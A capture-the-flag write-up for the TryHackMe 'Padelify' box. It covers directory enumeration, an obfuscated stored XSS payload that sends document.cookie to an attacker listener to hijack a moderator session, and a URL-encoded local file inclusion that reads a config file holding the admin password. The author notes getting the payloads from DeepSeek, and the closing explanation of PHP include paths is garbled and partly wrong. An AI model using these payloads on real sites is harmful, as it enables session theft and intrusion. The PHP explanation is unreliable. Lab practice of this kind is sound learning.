# TryHackMe Padelify Writeup

---

## gobuster

```
gobuster dir -u http://10.67.138.159 -a Mozilla/5.0 \
  -x txt,log,php,html,js,json,jsx,eml \
  -w /home/kali/Downloads/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

```

<img width="1343" height="643" alt="image" src="https://github.com/user-attachments/assets/efe2e655-4739-4e0d-a59b-21389e47c86f" />

<img width="1198" height="474" alt="image" src="https://github.com/user-attachments/assets/878e45ea-5a63-4df2-adf0-ab01c9fee2a2" />

```
http://10.67.138.159/logs/error.log
```

<img width="1297" height="253" alt="image" src="https://github.com/user-attachments/assets/4bfd4665-7f2d-494f-9958-2093a403cc3e" />

#### ASK deepseek to give me xss payloads because i used alot of payloads and it not work 

<img width="1015" height="448" alt="image" src="https://github.com/user-attachments/assets/eeb3ba49-f33f-4673-8317-e0e8c9e0c32c" />

```
username=<script>eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,54,56,46,49,56,56,58,56,56,56,56,47,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</script>&password=123&level=amateur&game_type=single
```

### wrtie it in request 

<img width="1244" height="495" alt="image" src="https://github.com/user-attachments/assets/1267a0fa-2789-4277-a1f4-a8a7b4ec07f6" />

### now lesten to get the cookie of modrator 

```
python3 -m http.server 8888
```

<img width="1096" height="349" alt="image" src="https://github.com/user-attachments/assets/3dd8b42f-5315-4b53-85de-f3e377a53bb4" />

```
di8rrtpci30gndif971ouhn8ks
```

<img width="1529" height="522" alt="image" src="https://github.com/user-attachments/assets/dbc10baa-08ca-4d4a-90a0-66354eb7fde7" />

----

## get admin cookie

> ## visit

```
http://10.130.129.203/live.php?page=match.php
```

> ## i try alot of lfi payloads and waf bypasses but all faild but when i try this that we found in logs

```
http://10.130.129.203/live.php?page=%2Fconfig%2Fapp%2Econf
```

<img width="1406" height="450" alt="image" src="https://github.com/user-attachments/assets/e05cacd5-7243-4ed5-bbe1-7b130feadace" />

## boom found admin password

<img width="1530" height="703" alt="image" src="https://github.com/user-attachments/assets/7ac358e4-9235-4ac8-ba17-cc59c9733110" />

<details>
 What does this mean?
================

i said to the server:

```
include("/config/app.conf");
```

* * * * *

 Where is this file in the first place?
=========================

From the logs we found:

```
/var/www/html/config/app.conf
```

* * * * *

 A very important point:
------------------

In PHP when I write:

```
include("/config/app.conf");
```

 Server hours:

- interpreted by relative to document root
- Which is often:

```
/var/www/html
```

* * * * *

 It remains as if:
------------------

```
/var/www/html/config/app.conf
```

</details>

